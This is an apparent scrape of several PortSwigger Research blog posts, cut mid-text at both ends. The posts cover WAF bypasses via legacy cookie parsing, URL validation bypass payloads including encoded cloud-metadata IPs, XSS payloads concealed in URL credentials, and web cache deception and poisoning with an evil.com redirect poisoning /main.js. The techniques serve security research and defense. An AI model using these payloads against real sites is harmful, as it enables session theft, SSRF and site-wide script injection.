Twitter) and Bluesky, and join the official PortSwigger Discord.\nFor more in-depth insights, I highly recommend Ankur Sundara’s blog post, Cookie Bugs - Smuggling & Injection.", "timestamp": "2025-10-21T13:33:11.479730"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Top 10 web hacking techniques of 2024: nominations open", "url": "https://portswigger.net/research/top-10-web-hacking-techniques-of-2024-nominations-open", "published": "Wed, 08 Jan 2025 14:07:27 GMT", "content": "Published: 08 January 2025 at 14:07 UTC\nUpdated: 22 January 2025 at 08:54 UTC\nNominations are now open for the top 10 new web hacking techniques of 2024!\nEvery year, security researchers from all over the world share their latest findings via blog posts, presentations, PoCs, and whitepapers. These contributions are all invaluable, but some stand out for their innovative approaches and the potential to be re-applied or adapted in new ways. Since 2006, the community has come together annually to sift through this wealth of research and identify the top ten techniques that truly push the boundaries of web security.\nNow it’s time to look back on 2024’s breakthroughs and forward to recognizing the most influential, inventive, and reusable research. Whether you’re an industry veteran or new to the project, you can explore our dedicated top 10 page to learn about the origins, history, and purpose of this initiative—plus an archive of past winners and highlights. Nominate your favorites, cast your votes, and help us crown the standout web hacking techniques of 2024!\nThis year, we'll target the following timeline:\nThe aim is to highlight research containing novel, practical techniques that can be re-applied to different systems. Individual vulnerabilities like log4shell are valuable at the time but typically age poorly, whereas underlying techniques such as JNDI Injection can be reapplied to great effect. Nominations can also be refinements to already-known attack classes, such as Exploiting XXE with Local DTD Files. For further examples, you might find it useful to check out previous year's top 10s.\nTo submit, simply provide a URL to the research, and an optional brief comment explaining what's novel about the work. Feel free to make as many nominations as you like, and nominate your own work if you think it's worthy!\nPlease note that I'll filter out nominations that are non-web focused, just tools, or not clearly innovative to keep the number of options in the community vote manageable. We don't collect email addresses - to get notified when the voting stage starts, follow @PortSwiggerRes on X, LinkedIn, or BlueSky.\nI've made a few nominations myself to get things started, and I'll update this list with fresh community nominations every few days. In the spirit of excessive automation, I've included AI-assisted summaries of each entry.", "timestamp": "2025-10-21T13:33:12.564211"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Bypassing WAFs with the phantom $Version cookie", "url": "https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie", "published": "Wed, 04 Dec 2024 15:03:35 GMT", "content": "Published: 04 December 2024 at 15:03 UTC\nUpdated: 30 June 2025 at 16:01 UTC\nHTTP cookies often control critical website features, but their long and convoluted history exposes them to parser discrepancy vulnerabilities. In this post, I'll explore some dangerous, lesser-known features of modern cookie parsers and show how they can be abused to bypass web application firewalls. This is the first part of a series of blog posts on cookie parsing.\nThere have been many attempts to standardize HTTP cookies, starting with the first official standard: RFC2109. Even though modern browsers do not support legacy RFCs, many web servers still do. Here's an example valid Cookie header:\nCookie: $Version=1; foo=\"bar\"; $Path=\"/\"; $Domain=abc;\n$Version is a required attribute, identifying the version of the state management specification to which the cookie conforms. Other interesting attributes include $Domain and $Path, which we’ll discuss later. According to the standard, a Cookie value can include special characters like spaces, semicolons, and equal signs if they are enclosed in double quotes:\nMany HTTP/1.1 header field values consist of words separated by LWS (Linear White Space) or special characters. These special characters MUST be in a quoted string to be used within a parameter value. - RFC 2068.\nModern frameworks analyze that header in the following ways:\nFlask: {\"foo\":\"bar\",\"$Version\":\"1\",\"$Path\":\"/\",\"$Domain\":\"abc\"}\nDjango: {\"foo\":\"bar\",\"$Version\":\"1\",\"$Path\":\"/\",\"$Domain\":\"abc\"}\nPHP: {\"foo\":\"\\\"bar\\\"\",\"$Version\":\"1\",\"$Path\":\"\\\"\\/\\\"\",\"$Domain\":\"abc\"}\nRuby: {\"foo\":\"\\\"bar\\\"\",\"$Version\":\"1\",\"$Path\":\"\\\"\\/\\\"\",\"$Domain\":\"abc\"}\nSpring: { \"foo\": \"\\\"bar\\\"\"}\nSimpleCookie: { \"foo\": \"bar\"}\nAs we can see, the results are messy. This mess gives us a chance to look for security weaknesses. Let’s focus on Spring Boot Starter Web 2.x.x first. It uses Apache Tomcat v. 9.0.83 by default, which processes cookie headers in the following ways:\nCookie: $Version=1; foo=\"\\b\\a\\r\"; $Path=/abc; $Domain=example.com =>\nSet-Cookie: foo=\"bar\"; Path=/abc; Domain=example.com\nAnother good example is the Python SimpleCookie parser, which supports legacy cookie request attributes when followed by key-value pairs. This enables the injection of malicious cookie attributes in the same manner demonstrated previously. All Python-based frameworks (Flask, Django, etc.) allow quoted cookie values but don't recognize the magic strings, like $Version, treating it as a normal cookie name instead. They also automatically decode octal escape sequences within quoted strings as follows:\nAny non-text character is translated into a 4 character sequence: a\nforward-slash followed by the three-digit octal equivalent of the character. -\nCookies.py\nFor example:\n\"\\012\" <=> \\n\n\"\\015\" <=> \\r\n\"\\073\" <=> ;\nMany WAFs are not equipped to detect the techniques described above, allowing malicious payloads to be hidden within quoted strings.\nIn addition, quoted cookies can facilitate injection vulnerabilities, such as SQL injection or command injection. These types of attacks often use special command separators - such as semicolons (;), commas (,), newline characters (\\n), and backslashes (\\). While typically restricted in cookie values, these can sometimes be manipulated to trigger vulnerabilities. Implementing this type of quoted cookie encoding can be easily achieved using a Burp Suite extension with the HttpHandler interface:\ndef handleHttpRequestToBeSent(requestToBeSent):\nresult = \"$Version=1; \"\nfor param in requestToBeSent.parameters:\nresult += f\"{param.name}=\\\"\"\nfor char in param.value:\nresult += f\"\\\\{char}\"\nresult += \"\\\"; \"\nreturn continueWith(requestToBeSent.withAddedHeader(\"Cookie\",result))\nFor example, the Amazon Web Services WAF blocks any request that contains any parameter inside disallowed function:\neval() => allowed\neval('test') => forbidden\n\"\\e\\v\\a\\l\\(\\'\\t\\e\\s\\t\\'\\)\" => allowed\n\"\\145\\166\\141\\154\\050\\047\\164\\145\\163\\164\\047\\051\" => allowed\nAnother crucial aspect of RFC2109: a server should also accept a comma (,) as a separator between cookie values. This can be exploited to bypass simple WAF signatures that may not anticipate a cookie name being concealed within the value. Additionally, the specification permits any number of space or tab characters before or after the equal sign in an injected attribute-value pair, which could also be used to avoid the detection. Consider the Cookie header example:\n$Version=1; foo=bar, abc = qux => \"abc\": \"qux\"\nLike many other HTTP headers, the Cookie header can be sent multiple times in a single request. The way how a server handles multiple identical headers may then vary. For example, I sent following GET request:\nGET / HTTP/1.1\nHost: example.com\nCookie: param1=value1;\nCookie: param2=value2;\nAnd got the following back:\nFlask: { \"param1\": \"value1\", \",param2\": \"value2\"}\nDjango: { \"param1\": \"value1\", \",param2\": \"value2\"}\nPHP: { \"param1\": \"value1\", \",_param2\": \"value2\"}\nRuby: { \"param1\": \"value1\", \", param2\": \"value2\"}\nSpring: { \"param1\": \"value1\", \"param2\": \"value2\"}\nAs we can see, Ruby, PHP, and the Python frameworks Django and Flask combine headers into a single comma-separated string (with an optional space between parameters). Quoted cookie values are also supported, which allows hiding malicious payloads by using the Cookie header as a multiline header continuation.\nUnfortunately, the quoted strings technique does not work with PHP and Ruby. To bypass the mentioned AWS signatures, you can use the following request:\nCookie: name=eval('test') => forbidden\nCookie: name=eval('test//\nCookie: comment')\nResulting cookie: name=eval('test//, comment') => allowed\nWe've implemented the best of these techniques in Param Miner for you:\nYou can take a range of steps to prevent parser discrepancy vulnerabilities in cookies, as follows:\nThis blog post is just the first part of our exploration into cookie parsing logic. To learn how these techniques can be applied in real-world scenarios to escalate vulnerabilities, be sure to check out the Stealing HttpOnly cookies with the cookie sandwich technique.\nFor our latest blog posts and security insights, follow us on X (formerly Twitter) and Bluesky, and join the official PortSwigger Discord.\nIf you're interested in learning more about quoted cookies, take a look at my earlier research on the Memcached Command Injections at Pylibmc\nIf you're curious about invalid characters in cookie headers,I recommend April King's Handling Cookies is a Minefield research.", "timestamp": "2025-10-21T13:33:13.654037"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "New crazy payloads in the URL Validation Bypass Cheat Sheet", "url": "https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet", "published": "Tue, 29 Oct 2024 13:59:13 GMT", "content": "Published: 29 October 2024 at 13:59 UTC\nUpdated: 22 November 2024 at 09:06 UTC\nThe strength of our URL Validation Bypass Cheat Sheet lies in the contributions from the web security community, and today’s update is no exception. We are excited to introduce a new and improved IP address calculator, inspired by @e1abrador's Encode IP Burp Suite Extension and many more.\nIn addition to the existing ways of representing an IPv4 address, we’ve added the following new formats, supported by Chrome, Firefox, Safari. For example, the cloud metadata IP address 169.254.169.254 can be represented in the following ways:\nPartial Decimal (Class B) format combines the third and fourth parts of the IP address into a decimal number\nPartial Decimal (Class A) format combines the second, third, and fourth parts of the IP address\nMixed Encodings: each segment of the IP address can be presented in different formats: hexadecimal, decimal, or octal. To keep our tool efficient, we don’t generate all possible combinations. Instead, we convert the first segment to hexadecimal, the second to decimal, and the last two segments to octal\nThe cheat sheet now also supports IPv6 addresses. When a valid IPv6 address is entered into the attacker’s hostname, the wordlist will be updated with the expanded form of the address. If the IPv6 address contains an embedded IPv4 address, the cheat sheet will extract it and generate all the previously mentioned formats. This behaviour can be disabled in the advanced settings.\nAdditionally, you can encode the resulting IP formats using special encodings like Circled Latin letters and numbers, Fullwidth Forms, or even Seven-segment display characters. To apply these, open the Advanced settings, go to Normalization settings, and select one or more encoding options.\nWe’ve added an intriguing new payload to our cheat sheet that targets discrepancies in userinfo parsing, submitted by @SeanPesce:\nThe “left square bracket” character [\nin the userinfo segment can cause Spring’s\nUriComponentsBuilder to return a hostname value that differs from how major\nbrowsers interpret it. This discrepancy can potentially lead to\nvulnerabilities such as open redirects or SSRF. While testing this payload\nwith our cheat sheet, I was also able to reproduce a separate\nexploit\nthat was patched in the same\nupdate. This is a perfect example of how our URL Validation Bypass Cheat Sheet\ncan be used to identify real-world vulnerabilities.\nWe’ve recently updated our CORS Bypass Cheat Sheet with new techniques, including an edge case related to localhost regex implementations and Safari-specific domain splitting attacks, submitted by @t0xodile. These updates address scenarios where attackers can manipulate domains using special characters to bypass validation checks. Examples include:\nMake sure to follow us on X (formerly Twitter) @PortSwiggerRes to stay informed about our latest updates and new attack techniques.\nA big thanks to the web security community for continuing to keep the URL Validation Bypass Cheat Sheet up to date with the latest techniques. If you’d like to contribute, feel free to raise an issue or submit a PR.", "timestamp": "2025-10-21T13:33:14.482244"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Concealing payloads in URL credentials", "url": "https://portswigger.net/research/concealing-payloads-in-url-credentials", "published": "Wed, 23 Oct 2024 12:59:05 GMT", "content": "Published: 23 October 2024 at 12:59 UTC\nUpdated: 23 October 2024 at 14:03 UTC\nLast year Johan Carlsson discovered you could conceal payloads inside the credentials part of the URL . This was fascinating to me especially because the payload is not actually visible in the URL in both Chrome and Firefox. This even persists through same origin navigations. So like a dog with a bone I wouldn't let go and tried to see what was possible...\nThe first surprising thing to me was document.URL does not always match location.\nhttps://foo:bar@portswigger-labs.net\nalert(location);//https://portswigger-labs.net/\nalert(document.URL);//https://foo:bar@portswigger-labs.net/\nI had assumed these two properties were the same since I'd never observed them being different but it turns out that document.URL contains the credentials part of the URL whereas location doesn't. What that means is you can use just URL inside an event grab the payload from the credentials:\nhttps://alert(1)@portswigger-labs.net\n<img src onerror=alert(URL.slice(8,16))>\nAfter fuzzing to identify which characters are encoded in the credentials part of the URL , Shazzer discovered that Firefox doesn't URL-encode single quotes. This is particularly useful in DOM XSS scenarios, if the site removes the query string and hash. As it makes vulnerabilities like this exploitable in Firefox:\nfunction getBase(url) {\nreturn url.split(/[?#]/)[0];\n}\ndocument.write(`<script>const url='${getBase(document.URL)}';<\\/script>`);\nTo exploit this you need to provide the payload in the credentials part on Firefox like this:\nhttps://'-alert(1)-'@example.com\nThis can be delivered using redirection or user navigation. You can even use this technique to control the username or password properties of anchor links. This works because every anchor element has these properties, which store the credentials from the URL. If it's a relative link, it inherits the parent credentials, allowing you to clobber these values:\nhttps://clobbered@example.com\n<a href=# onclick=alert(username)>test</a>\nYou can combine this with DOM Clobbering to give you control over objects with username or password properties. Note you can even supply a blank href which still enables control over username or password via the URL.\nhttps://user:pass@example.com\n<a href id=x>test</a>\n<script>\neval(x.username)//user\neval(x.password)//pass\n</script>\nIn conclusion, discovering the discrepancies between location and document.URL and how document.URL retains the credentials part of the URL - even when browsers like Chrome and Firefox hide it from the address bar is quite surprising. Firefox’s handling of certain characters, such as single quotes, which are not URL-encoded, could be useful for DOM XSS too.\nThe ability to conceal payloads through credentials, manipulate the username and password properties within anchor elements, and potentially combine this with DOM clobbering can be used for more advanced exploitation.\nNote: Safari discards URL credentials. All the examples shown only work on Chrome and Firefox. Also Chrome blocks sub-resources from using URL credentials.", "timestamp": "2025-10-21T13:33:15.536658"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Introducing the URL validation bypass cheat sheet", "url": "https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet", "published": "Tue, 03 Sep 2024 14:52:12 GMT", "content": "Published: 03 September 2024 at 14:52 UTC\nUpdated: 05 September 2024 at 12:36 UTC\nURL validation bypasses are the root cause of numerous vulnerabilities\nincluding many instances of\nSSRF,\nCORS misconfiguration, and\nopen redirection. These work by using ambiguous URLs to trigger URL parsing discrepancies\nand bypass validation. However, many of these techniques are poorly\ndocumented and overlooked as a result.\nTo address this, we wanted to create a cheat sheet that consolidates all known payloads, saving you the time and effort of searching and gathering information from across the Internet. Today, we're excited to introduce a new tool designed to solve this problem: the URL Validation Bypass Cheat Sheet.\nWe hope you find it useful! This is a frequently updated repository of all known techniques, allowing you to quickly generate a wordlist that meets your needs.\nThe URL Validation Bypass Cheat Sheet is a brand new interactive web application that automatically adjusts its settings based on your context. Currently, there are three contexts available:\nInitially, the cheat sheet provides six types of payload wordlists. The advanced settings allow you to select a specific wordlist or use all of them simultaneously. Here's a brief overview of the most important ones:\nThe URL Validation Cheat Sheet supports several types of string encoding:\n[\"!\",\"$\",\"'\",\"\\\"\",\"(\",\")\",\"*\",\",\",\"-\",\".\",\"/\",\"\\\\\",\":\",\";\",\"[\",\"]\",\"^\",\"_\",\"{\",\"}\",\"|\",\"~\"]\n\\uXXXX\n, except for the following characters:\n['\"','\\\\','\\b','\\f','\\n','\\r','\\t']\nand those in the range [0x0020 - 0x007f]\nNote: Unencoded strings should be used with caution, as Unicode values may not be transmitted correctly.\nWhen working with web applications, encoding IP addresses into different formats can be crucial for testing, validation, and security purposes. The cheat sheet supports standard IPv4 address as attacker IP input and returns an array of encoded representations, including octal, hexadecimal, binary, and decimal formats. It also converts an IPv4 address into its IPv6-mapped address format.\nEncoding Details:\n0177.0000.0000.0001\n0x7F.0x00.0x00.0x01\n01111111.00000000.00000000.00000001\n127.0.1\n2130706433\n45080379393\n[::FFFF:7F00:0001]\nor ::FFFF:127.0.0.1\nThe wordlists include numerous payloads that exploit Unicode string normalization. For instance, the normalization of the following characters results in an empty string:\nThese techniques can be used to bypass Web Application Firewalls (WAFs).\nAnother example of an allowed domain bypass occurs when a validation regular expression permits multiline strings. For instance, if the regex ^allowed_domain$ is used, the following can bypass the validation:\nThis cheat sheet wouldn't be possible without the web security community who share their research. Big thanks to: Gareth Heyes, James Kettle, Jann Horn, Liv Matan, Takeshi Terada, Orange Tsai, Nicolas Grégoire.\nWe published all payloads at our GitHub account https://github.com/PortSwigger/url-cheatsheet-data, so you can contribute to this cheat sheet by creating a new issue or updating the JSON files and submitting a pull request.\nWe look forward to your interesting discoveries using our new URL validation bypass cheat sheet!", "timestamp": "2025-10-21T13:33:16.618419"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Gotta cache 'em all: bending the rules of web cache exploitation", "url": "https://portswigger.net/research/gotta-cache-em-all", "published": "Thu, 08 Aug 2024 22:27:46 GMT", "content": "Published: 08 August 2024 at 22:27 UTC\nUpdated: 17 October 2024 at 13:41 UTC\nThrough the years, we have seen many attacks exploiting web caches to hijack sensitive information or store malicious payloads.\nHowever, as CDNs became more popular, new discrepancies between proprietary URL parsers prove that we have only seen the tip of the iceberg.\nIn this paper will explore how different HTTP servers and proxies behave when parsing specially crafted URLs and explore ambiguities in the RFC that lead to path confusion. It will also introduce a set of novel techniques that can be used to leverage parser discrepancies and achieve arbitrary web cache poisoning and deception in countless websites and CDN providers.\nThis research is also available in print/download-friendly PDF format\nYou can also watch the recording of my DEFCON presentation here:\nWeb caches have been around since the beginning of the internet. This technology works by fingerprinting requests using a key, which in most cases will be built using some or all parts of the requested URL, and mapping the key with stored static responses.\nIn recent years, most productive systems incorporate caching by setting Content Delivery Networks (CDNs) with providers like CloudFlare, Akamai, or CloudFront. CDNs can be seen as a network of web cache proxies that are distributed around the globe. They serve static responses, increasing the efficiency and scalability of a system.\nThis paper focuses on URL parsing discrepancies that exist between different application servers and CDN proxies, but the same techniques can be applied to any type of web cache, including those integrated in the origin server itself.\nAs web caches play a crucial role in modern systems, researchers have looked for ways to exploit them to store dynamic information. This information could be used to obtain sensitive data or deliver malicious payloads. These attacks typically target one of two processes: key generation or cache rule analysis.\nCalculating the key is crucial as every request with the same fingerprint should generate the same response, regardless of when it was sent or what additional information it contains (like body or extra headers). If the response varies based on the value of a specific header, then that value should be part of the key. Storing a message with a malicious payload intended to match an incorrect key is called web cache poisoning.\nCache rules are designed to recognize if a response is static and should be stored. Failing to cache a static resource can affect performance, but storing a dynamic response with sensitive information meant for an authenticated user can be devastating for an application. If an attacker can craft a malicious request that retrieves and caches user data, they may be able to hijack tokens and API keys, potentially leading to a full account takeover. This is known as web cache deception.\nTo evaluate cache rules, calculate cache keys, and map endpoint handlers, the origin server must extract the absolute path of the requested resource. This is done by parsing the URL using path delimiters and normalization.\nIf the cache and application server’s parsers are different, it may be possible to use a discrepancy to change the meaning of the URL. This may enable you to control which responses are stored and the key that is used to access them.\nThe URL RFC defines certain characters as delimiters, for example the semicolon or question mark. However the specification is quite permissive and allows each implementation to add custom characters to this list.\nThis research showed that many popular frameworks and HTTP servers use different characters as delimiters. This can create path confusion between the origin server and the cache parser.\nThe following custom delimiters are used in various application servers and frameworks:\n1) Identify a non-cacheable request. Look for a request with a method that isn't idempotent, such as POST, or a response with a Cache-Control: no-store or Cache-Control: private header. The response (R0) will be used to compare the behavior of interesting characters in the URL.\n2)Send the same request, only this time append a random suffix at the end of the path, for example, if the original path was /home send a request to /homeabcd. If the response (R1) is the same as R0, repeat step 1 and 2 with a different endpoint.\n3)Send the same request as step 2, but include a potential delimiter before the random suffix. If the delimiter being tested is $, the path should look like /home$abcd. Compare this response (R2) with the base one (R0).\nIf the messages are identical, the character or string is used as a delimiter.\nTo test a number of possible delimiters at once, you can use Burp Intruder with a wordlist that includes all ASCII characters. Be sure to test both unencoded and URL-encoded versions of the characters.\nCache servers often don't use delimiters aside from the question mark. It's possible to test this using a static request and response:\n1) Identify a cacheable request by looking for evidence that the response is retrieved from the cache. For example, by response time analysis, or by looking for an X-Cache header with the value hit\n. This response (R0) will be used to compare the behavior of interesting characters in the URL.\n2) Send the same request with a URL path suffix followed by the possible delimiter and a random value.\nGET /static-endpoint<DELIMITER><Random>\n3) Compare the response with R0. If the messages are identical, the character or string is used as a delimiter.\nURL parsers are used by both the cache and origin server to extract paths for endpoint mapping, cache keys, and rules. First, path delimiters are identified to locate the start and end of the pathname. Once the path is extracted, it's normalized to its absolute form by decoding characters and removing dot-segments.\nSometimes, a delimiter character needs to be sent for interpretation by the application rather than the HTTP parser. For such cases, the URI RFC defines URL encoding, which allows characters to be encoded to avoid modifying the meaning of the pathname.\nMany HTTP servers and proxies including Nginx, Node, CloudFlare, CloudFront and Google Cloud decode certain delimiter characters before interpreting the pathname. To make things worse, this process is inconsistent. This means that the same URL will have a different meaning in the most popular CDNs and origin servers even without any custom configuration.\nIn addition, the RFC doesn't specify how a request should be forwarded or rewritten. Many proxies decode the URL and forward the message with the decoded values. If this occurs, the next parser may use the decoded characters as delimiters. Therefore, if the following request is received by a proxy, the %3F character will be converted to a question mark symbol\n\"/myAccount%3Fparam\" → \"/myAccount?param\"There are also many other encodings supported by different cache proxies. Even though most of them are not used by default, it is possible to configure CDNs like CloudFlare or CloudFront to apply custom transformations and decode the path for caching or access control purposes.\nTo test if a character is being decoded, compare a base request with its encoded version. For example:\n/home/index → /%68%6f%6d%65%2f%69%6e%64%65%78\nNote: It might be useful to encode each character individually, as sometimes specific characters are not decoded (like the slash or other reserved characters).\nIf the response is the same as the base response and wasn't obtained from the cache (no cache hit header), the origin server decodes the path before using it. If the response is cacheable, it's possible to detect the cache parser's decoding behavior. Send the original request followed by the encoded version. If both responses contain the same cache headers, it means that the second one was obtained from the proxy, and the key was decoded before being compared.\nThe URI RFC also defines how to handle dot-segments in a URL and provides a simple algorithm to normalize the path. While this feature is crucial for referencing any resource from a relative path, it's also the source of many vulnerabilities.\nIt's possible to exploit dot-segment normalization by leveraging the discrepancies between parsers to modify the behavior of the cache rules and obtain crafted keys. Even popular HTTP servers like Apache and Nginx resolve URLs completely differently, meaning it is impossible to use the same cache proxy without having a path confusion vulnerability.\nThe following techniques can be used to detect dot-segment normalization at both the cache and the origin server. These tests can be extended using encoded path traversal payloads to know if a special decoding is applied. For this, use the same request / responses and replace the dot-segments with the encoded version.\nTo detect normalization in the origin server, issue a non-cacheable request (or a request with a cache buster) to a known path, then send the same message with a path traversal sequence:\nGET /home/index?cacheBuster\nGET /aaa/../home/index?cacheBuster or GET /aaa\\..\\home/index?cacheBuster\nIf the responses are identical, this means that the path is normalized before it's mapped with a resource. This can either happen at the origin server or before being forwarded by a proxy. Either way, the dot-segment is resolved and can be used to reference an existing resource.\nTo detect normalization at the web cache, repeat the same process but with a cacheable response and compare the X-Cache and Cache-Control headers to verify if the resource was obtained from the cache memory.\nThe following tables illustrate how different HTTP servers and web cache proxies normalize the path /hello/..%2fworld. Some resolve the path to /world, while others don't normalize it at all.\nWhen the web cache receives a response from the origin server, it must decide if the resource is static and should therefore be stored. This involves applying predefined, customizable rules to the request and response.\nThis section focuses on rules that use the URL to determine if a response should be cached. These are popular in production environments and most CDNs include some of these rules by default.\nIt's possible to use parsing discrepancies to exploit cache rules, to store dynamic responses and hijack sensitive information that was generated for a victim.\nA detailed explanation of how to use discrepancies in URL mapping to create path confusion can be found in Omer Gil’s white paper Web cache deception attack.\nThis white paper focuses on other types of discrepancies, which can be exploited to hijack any arbitrary response, not only those with special endpoint mapping at the origin server.\nSince the attacker needs to generate a link that's used by a victim's browser, the payload must contain safe URL characters only - those the browser won't encode before sending.\nTo visualize this scenario, consider the browser as a proxy that rewrites the request URL by encoding certain characters and removing segments.\nMost CDN providers, such as CloudFlare and Akamai, store responses for resources with static extensions. This means that if the requested path ends with a string like .js or .css the cache proxy treats the response as static. It stores the response and uses it to serve other clients that request the same path.\nEach CDN or cache proxy defines its own list of recognized static extensions. The image below shows those listed by CloudFlare:\nWhen a character is used as a delimiter by the origin server but not the cache, it's possible to include an arbitrary suffix to trigger a cache rule and store any sensitive response.\nFor example, if the dollar sign character is a delimiter in the origin server but not the proxy, the following link stores the response to /myAccount, allowing an attacker to hijack sensitive information:\nYou can also use the same technique with an encoded character or string. This is useful when the origin server decodes a delimiter before parsing the URL, or if the path is rewritten by the cache before forwarding the request. For example, the unencoded hashtag symbol wouldn't work for cache deception as its not sent by the browser, but if it's encoded it can be used for an exploit:\nYou can use a variation of this attack to exploit a discrepancy from a forwarding transformation. If multiple parsers rewrite the request, we can attack a specific cache proxy of the chain by applying multiple encodings and/or delimiters:\nA popular rule implemented in all CDNs allows the user to create rules that match a custom URL path prefix. This can be used to let the web cache know that every resource in a specific directory is immutable and should be stored, no matter the resource name or extension.\nSome common examples of static directories are:\nIf a character is used as a delimiter by the origin server but not by the cache and the cache normalizes the path before applying a static directory rule, you can hide a path traversal segment after the delimiter, which the cache will resolve:\nGET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>\nIt's important to encode the dot-segment. Otherwise the victim’s browser will resolve it and won't forward the original malicious path.\nAmazon CloudFront, Microsoft Azure, and Imperva normalize the path before evaluating the cache rules by default.\nWhen the origin server normalizes the path before mapping the endpoint and the cache doesn't normalize the path before evaluating the cache rules, you can add a path traversal segment that will only be processed by the origin server:\nGET /<Static_Directory><Encoded_Dot_Segment><Dynamic_Resource>\nCloudflare, Google Cloud, and Fastly don't normalize the path before evaluating the cache rules. If the origin server normalizes the path before mapping the request with an endpoint handler, such as Nginx, Microsoft IIS and OpenLiteSpeed, it is possible to exploit any static directory rule.\nAnother normalization discrepancy arises when combining Microsoft IIS with any web cache that doesn't convert backlashes. These caches interpret encoded backslashes as regular slashes. Since no tested CDN recognizes this transformation, IIS is vulnerable when used with such products.\nSome files, like /robots.txt, /favicon.ico, and /index.html, might not be in a static directory or have a static extension but are expected to be immutable in every website. To store these files it is possible to create a cache rule that looks for an exact match of the filename in the path. CDNs like CloudFlare have this rule by default and always store responses for robots.txt or favicon.ico.\nTo exploit static file rules it is possible to use the same technique as for static directories when there is normalization at the frontend and a delimiter at backend. In this case, the static directory is replaced by the filename and a cache buster to avoid hitting a cached resource:\nGET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_File>\nWhen a response is considered static, it's stored in the cache using a key that is derived from the original request. Any future request with the same key will be served with the stored resource.\nKeys are usually generated using the URL and host header. They can be customized to use other headers or request elements.\nIn classic web cache poisoning, the attacker attempts to store a malicious response using a URL key that is requested by users while they navigate the vulnerable website. The more frequently the path is visited, the more victims will be affected by the malicious payload. You can read more about finding web cache poisoning vulnerabilities in James Kettle's research Practical Web Cache Poisoning and Web Cache Entanglements: Novel pathways to poisoning.\nThe attack is limited, as in many cases the poisoned path is not controlled by the attacker and user interaction is required. For example, consider a URL that is never visited, either because it requires a specific parameter such as /home?param=XSS, or because the path itself contains the payload /<script>alert()</script>\nHowever, combining path confusion with a web cache poisoning vulnerability could allow you to modify the cache key and poison a highly requested resource, like the website's homepage. In this case, there's no limitation on the characters that can be used, as the attacks don't require user interaction, which means that the payload can be sent through an HTTP editor/repeater like Burp Suite.\nNormalizing a URL is usually considered a safe action that helps to obtain the absolute path of a requested resource. However, resolving dot-segments and encodings in a cache key could allow an attacker to poison arbitrary resources if the origin server is not interpreting the path in the same way.\nAll the following attacks assume that the URL is normalized before generating the cache key. This can be configured in most CDNs and is a default behavior in Microsoft Azure and Imperva.\nWhen the origin server uses a special mapping or doesn't normalize the path before generating the response, it's possible to control the key used for stored resources. An classic example of this are applications that have a self-reflected XSS when an non-existing endpoint is visited.\nConsider the following request/response:\nGET /<script>X</script> HTTP/1.1\nHost: server.com\nHTTP/1.1 404 Not Found\nContent-Type: text/html\nCache-Control: public\nNot Found /<script>X</script>\nThe malicious payload is part of the URL and is reflected in a cacheable response. However, a valid user would never issue a request to /<script>X</script> if there is no interaction with the attacker. Therefore, even if the response is also accessible through the encoded version /%3Cscript%3EX%3C/script%3E (the key is decoded), the attacker will need to send a link to the victim, just as in a reflected XSS scenario.\nHowever, if the key is normalized, the following payload would poison a highly visited endpoint like /home with the malicious response:\nGET /<Backend_Path><Path_Traversal><Poisoned_Path>\nThe double dot-segment is used in this example as the payload already contains a slash. Adjust the path traversal to resolve to the desired poisoned endpoint. The same technique can be applied if a special mapping is used for the backend_path placeholder.\nWhen a character is used as a delimiter by the origin server but not by the cache, it's possible to generate an arbitrary key for the cacheable resource. The delimiter will stop the backend from resolving the dot-segment.\nGET /<Backend_Path><Delimiter><Path_Traversal><Poisoned_Path>\nIn web cache deception attacks, the parsing discrepancy was caused by a delimiter being used only in the origin server but not in the cache. Finding a character with special meaning for the cache server that can be sent through a browser is rare. However, as web cache poisoning doesn't require user interaction, delimiters like the hash can create path confusion. This is useful because fragments are interpreted differently by many HTTP servers, CDNs, and backend frameworks, as shown in the tables below:\nTherefore, in cases like Microsoft Azure, which normalizes the path and treats the hash as a delimiter, it's possible to use this to modify the cache key of the stored resource:\nGET /<Poisoned_Path><Front-End_Delimiter><Path_Traversal><Backend_Path>\nThis technique could be applied to any delimiter used by the cache. The only requirement is that the key is normalized and the path is forwarded with the suffix after the delimiter.\nWhen auditing a website for a pentest or bug bounty program, it's common to find vulnerabilities that aren't exploitable due to browser constraints and limitations. These issues require user interaction and can't be sent through the browser because the request needs specific crafted headers or characters in the URL that get encoded.\nBy combining these vulnerabilities with the previously described cache poisoning and deception techniques, an attacker could exploit them and store a malicious payload in the cache.\nFor example, consider a website with an open redirect where the location is generated with an X-Forwarded-Host header:\nGET /home HTTP/1.1\nHost: server.com\nX-Forwarded-Host: evil.com\nHTTP/1.1 302 Found\nLocation: http://evil.com/index.html\nBy itself, this redirect isn't stored in the cache, so it shouldn't be possible to poison the cache with it. However, if there's a discrepancy between the cache key and backend parser, this 'unexploitable' vulnerability could be escalated to a full domain takeover. For example, if the web application loads the /main.js script on the homepage, we can poison the path in the cache and redirect the browser to load a malicious script:\nThis forces the cache proxy into storing the redirect response to evil.com under the /main.js key. When a victim loads the homepage and tries to access the /main.js resource, a malicious redirect will obtain a JavaScript controlled by the attacker which will infect every user browser.\nIn an even worse scenario, the open redirect is stored due to a cache header:\nGET /redirect?somePage HTTP/1.1\nHost: vulnerable.com\nX-Forwarded-Host: evil.com\nHTTP/1.1 302 Found\nLocation: http://evil.com/somePage\nCache-Control: public, max-age=3600\nIn this case, the poisoned path wouldn’t need a static extension and the vulnerability could be leveraged to complete arbitrary cache poisoning and full website defacement.\nThe same technique can be used with any other user interaction required or self reflected issue, like a self-reflected and not-exploitable XSS.\nThe easiest way to protect against web cache deception is to mark all dynamically generated responses with a Cache-Control header, set with the no-store and private directives. This tells the web cache that the resource should never be stored.\nIt is also important to verify that the cache rules don't have priority over the Cache-Control header. This can be configured in most CDNs. If it can't be configured, consider disabling the caching rules or avoid using an origin server or framework that parses the URL differently to the CDN.\nTo protect against cache key confusion make sure that the cache key isn't normalized and that the suffix after a cache delimiter isn't forwarded to the application server. If this 